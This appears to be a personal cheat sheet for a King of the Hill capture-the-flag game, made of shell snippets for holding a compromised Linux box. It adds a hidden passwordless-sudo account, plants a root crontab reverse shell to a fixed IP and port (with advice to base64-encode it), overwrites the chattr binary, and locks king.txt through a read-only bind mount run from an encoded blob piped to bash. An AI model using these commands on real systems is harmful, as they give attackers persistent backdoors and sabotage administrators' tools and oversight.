# Get TTY
```bash
SHELL=/bin/bash script -q /dev/null
```
CTRL+Z
```bash
stty raw -echo;fg
```
`reset`
# Compile kingmaker.c with no dep
```bash
gcc -static -o proc proc.c
```
# Add New Super User
```bash
useradd phpadmin && (echo -e "phpadmin\nphpadmin" | passwd phpadmin) && (echo "phpadmin ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers)
```
# Add Backdoor To Crontab (It's not neccessary if you use Reverse SSH)
Encode with base 64 and add to /etc/crontab
```bash
* * * * * root bash -c "0<&196;exec 196<>/dev/tcp/10.8.85.10/9999; sh <&196 >&196 2>&196"
```
# Modify /etc/sudoers
```bash
echo "$USERNAME ALL=(ALL:ALL) ALL" >> /etc/sudoers
```
# [Reverse SSH](https://github.com/NHAS/reverse_ssh)

# Find SUID
```bash
find / -perm /4000 2>/dev/null
```
# Find Chattr ?
```bash
find / -perm /4000 2>/dev/null
```
# Hello Chattr
```bash
echo 'echo IF8gICBfICAgICAgICAgXyAgXyAgICAgICAgICBfICAgX18gXwp8IHwgfCB8ICBfX18gIHwgfHwgfCAgX19fICAgfCB8IC8gLyhfKSAgXyAgICAgXwp8IHxffCB8IC8gXyBcIHwgfHwgfCAvIF8gXCAgfCB8LyAvICBfIF98IHxfIF98IHxfICBfICBfCnwgIF8gIHwvIC9fXCBcfCB8fCB8LyAvIFwgXCB8ICAgLyAgfCB8XyAgIF98XyAgIF98fCB8LyAvCnwgfCB8IHxcICxfX18vfCB8fCB8XCBcXy8gLyB8IHxcIFwgfCB8IHwgfF8gIHwgfF8gfCAvIC8KfF98IHxffCBcX19fLyB8X3x8X3wgXF9fXy8gIHxffCBcX1x8X3wgXF9fX3wgXF9fX3x8ICAvCiAgICAgICAgICAgICAgICAgICAgICAgXyAgICAgICAgICAgXyAgICAgICAgICAgICAgLyAvCiAgICAgICAgICAgICAgICAgICAgICAvIFxfX19fX19fIC98X1wgICAgICAgICAgICAgXC8KICAgICAgICAgICAgICAgICAgICAgLyAgICAgICAgICAvXy8gXF9fCiAgICAgICAgICAgICAgICAgICAgLyAgICAgICAgICAgICBcXy8gLwogICAgICAgICAgICAgICAgICBffF8gICAgICAgICAgICAgIHwvfF8KICAgICAgICAgICAgICAgICAgX3xfICBPICAgIF8gICAgTyAgX3xfCiAgICAgICAgICAgICAgICAgIF98XyAgICAgIChfKSAgICAgIF98XwogICAgICAgICAgICAgICAgICAgXCAgICAgICAgICAgICAgICAgLwogICAgICAgICAgICAgICAgICAgIF9cX19fX19fX19fX19fXy9fCiAgICAgICAgICAgICAgICAgICAvICBcLyAgKF9fXykgIFwvICBcCiAgICAgICAgICAgICAgICAgICBcX18oICBvICAgICBvICApX18vCgoKCgo= | base64 -d' > $(which chattr)
```
```
                             _   _         _  _          _   __ _
                            | | | |  ___  | || |  ___   | | / /(_)  _     _
                            | |_| | / _ \ | || | / _ \  | |/ /  _ _| |_ _| |_  _  _
                            |  _  |/ /_\ \| || |/ / \ \ |   /  | |_   _|_   _|| |/ /
                            | | | |\ ,___/| || |\ \_/ / | |\ \ | | | |_  | |_ | / /
                            |_| |_| \___/ |_||_| \___/  |_| \_\|_| \___| \___||  /
                                                   _           _              / /
                                                  / \_______ /|_\             \/
                                                 /          /_/ \__
                                                /             \_/ /
                                              _|_              |/|_
                                              _|_  O    _    O  _|_
                                              _|_      (_)      _|_
                                               \                 /
                                                _\_____________/_
                                               /  \/  (___)  \/  \
                                               \__(  o     o  )__/
```

# Mount
```bash
sudo lessecho lomarkomar > /root/king.txt
sudo dd if=/dev/zero of=/dev/shm/root_f bs=1000 count=100
sudo mkfs.ext3 /dev/shm/root_f
sudo mkdir /dev/shm/sqashfs
sudo mount -o loop /dev/shm/root_f /dev/shm/sqashfs/
sudo chmod -R 777 /dev/shm/sqashfs/
sudo lessecho lomarkomar > /dev/shm/sqashfs/king.txt
sudo mount -o ro,remount /dev/shm/sqashfs
sudo mount -o bind /dev/shm/sqashfs/king.txt /root/king.txt
sudo rm -rf /dev/shm/root_f
```
```bash
echo c3VkbyBsZXNzZWNobyBsb21hcmtvbWFyID4gL3Jvb3Qva2luZy50eHQKc3VkbyBkZCBpZj0vZGV2L3plcm8gb2Y9L2Rldi9zaG0vcm9vdF9mIGJzPTEwMDAgY291bnQ9MTAwCnN1ZG8gbWtmcy5leHQzIC9kZXYvc2htL3Jvb3RfZgpzdWRvIG1rZGlyIC9kZXYvc2htL3NxYXNoZnMKc3VkbyBtb3VudCAtbyBsb29wIC9kZXYvc2htL3Jvb3RfZiAvZGV2L3NobS9zcWFzaGZzLwpzdWRvIGNobW9kIC1SIDc3NyAvZGV2L3NobS9zcWFzaGZzLwpzdWRvIGxlc3NlY2hvIGxvbWFya29tYXIgPiAvZGV2L3NobS9zcWFzaGZzL2tpbmcudHh0CnN1ZG8gbW91bnQgLW8gcm8scmVtb3VudCAvZGV2L3NobS9zcWFzaGZzCnN1ZG8gbW91bnQgLW8gYmluZCAvZGV2L3NobS9zcWFzaGZzL2tpbmcudHh0IC9yb290L2tpbmcudHh0CnN1ZG8gcm0gLXJmIC9kZXYvc2htL3Jvb3RfZiA= | base64 -d | bash
```
# Symbolic Link
```bash
mkdir /dev/shm/.lokal
cp -r /root/ /dev/shm/.lokal/x
cd /dev/shm/.lokal/x/root
rm king.txt
echo "lomarkomar" > x
ln -s x king.txt
```
